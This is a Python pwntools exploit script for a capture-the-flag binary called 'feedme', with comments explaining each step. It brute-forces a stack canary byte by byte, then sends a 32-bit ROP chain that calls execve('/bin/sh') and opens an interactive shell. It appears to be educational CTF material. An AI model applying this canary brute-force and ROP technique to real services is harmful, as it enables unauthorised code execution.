import pwn
import struct
import binascii

# feedme is a 32-bit statically linked binary
# NX is enabled; ASLR is turned on

# This exploit has two parts:

# There is a custom 4-byte canary
# The first part of this exploit is brute forcing said canary
# We can brute force because this binary creates children up to 800 times after its children have their stacks smashed
# Becuase we know that the canary will end in a null byte, we need to brute force the other 3 bytes of the canary
# We do this by stack overflowing up to the target byte of the canary, and then iterating over possible values untill stack smashing is not detected
# Then, we increase the size of our overflow by 1 byte and brute force the next canary value

# The second part of this exploit is a basic full rop chain for 32-bit executable
# The difference from a full rop chain for 64-bit executable is that we have to
# move the string /bin/sh in two parts because it is more than 4 bytes long
# also, of course, we make a call to int 0x80 instead of execve


target = pwn.process("./feedme")
# pwn.gdb.attach(target)

############################################
#### Function to Brute-force the Canary ####
############################################

def breakCanary():
    # We know that the first byte of the canary is a null byte, because it is null terminated
    known_canary = b'\0'

    canary = 0x0 # The current canary value we are checking
    input_bytes_counter = 0x22 # The current size of our overflow
    
    # These two lines generate a list of bytes: [b'\x00', b'\x01', ... b'\xff']
    string_hexes = ['0' * (2-len(d)) + d for d in [f'{q:x}' for q in range(0x0, 0xff + 1)]] # i.to_bytes(1, 'little') would work much better
    bin_hexes = [binascii.unhexlify(z) for z in string_hexes]

    # iterate 3 times for the 3 bytes we need to brute force
    for j in range(0,3):
        # iterate up to 0xff to brute force all possible values for byte
        for canary in bin_hexes:
            print(b"Trying canary: " + binascii.hexlify(canary) + binascii.hexlify(known_canary))
            target.send(bin_hexes[input_bytes_counter]) # send the current input size
            target.send(b'0' * 0x20 + known_canary + canary) # send this iterations' canary

            # Scan the output, determine if we have the correct value
            output = target.recvuntil(b'exit.' or b'bytes!')
            if b'YUM' in output:
                # If we have a correct value, record the canary value and move on
                print(b"next byte is: " + binascii.hexlify(canary))
                known_canary = known_canary + canary
                input_bytes_counter += 1
                break
    return struct.unpack("<I", known_canary)[0]

##############################
#### Gadgets we will Need ####
##############################

# 32 bit binary: syscall params are eax, ebx, ecx, edx

# pop eax gadget: 0x080bb496: pop eax; ret;
pop_eax = struct.pack("<I", 0x080bb496)

# pop ecx gadget: 
# There isn't a perfect gadget: This one is fine though, we will just use it to pop ebx as well:
# 0x0806f371: pop ecx; pop ebx; ret;
pop_ebx_ecx = struct.pack("<I", 0x0806f371)

# pop edx gadget: 0x0806f34a: pop edx; ret;
pop_edx = struct.pack("<I", 0x0806f34a)

# int 0x80 gadget: 0x08049761: int 0x80;
syscall = struct.pack("<I", 0x08049761)

# Gadget to move /bin/sh to memory
#0x0807be31: mov dword ptr [eax], edx; ret;
mov_gadget = struct.pack("<I", 0x0807be31)

# Writeable Memory Address: 0x80ea000
mem_addr = struct.pack("<I", 0x80ea000)
mem_addr_plus_four = struct.pack("<I", 0x80ea004)

null_bytes = struct.pack("<I", 0x0)

######################################
#### Assembling our final payload ####
######################################

canary = breakCanary()
print(f"The canary is: {hex(canary)}")

# Canary is after 32nd byte, then 12 more bytes to stack ptr

payload = b'0' * 32
payload += struct.pack("<I", canary)
payload += b'0' * 12
payload += pop_eax
payload += mem_addr
payload += pop_edx
payload += b'/bin' # first four bytes
payload += mov_gadget

payload += pop_eax
payload += mem_addr_plus_four
payload += pop_edx
payload += b'/sh\x00' # second four bytes
payload += mov_gadget

payload += pop_eax
payload += struct.pack("<I", 0x0b) # execve code

payload += pop_ebx_ecx # Will pop ebx, then ecx
payload += null_bytes
payload += mem_addr

payload += pop_edx
payload += null_bytes
payload += syscall

#print(f"length of payload = {len(payload)}")

target.recvuntil(b'ME!')

# Using this plus ps -aux will allow you to attach a gdb session manually to the final child process while you are running
# gdb -p <pid>
# input('stopped here... press enter:') # stop python's execution to allow you time to attach a new gdb process via command line

target.send(b'\x78') # The size of our payload
target.send(payload)
target.interactive()
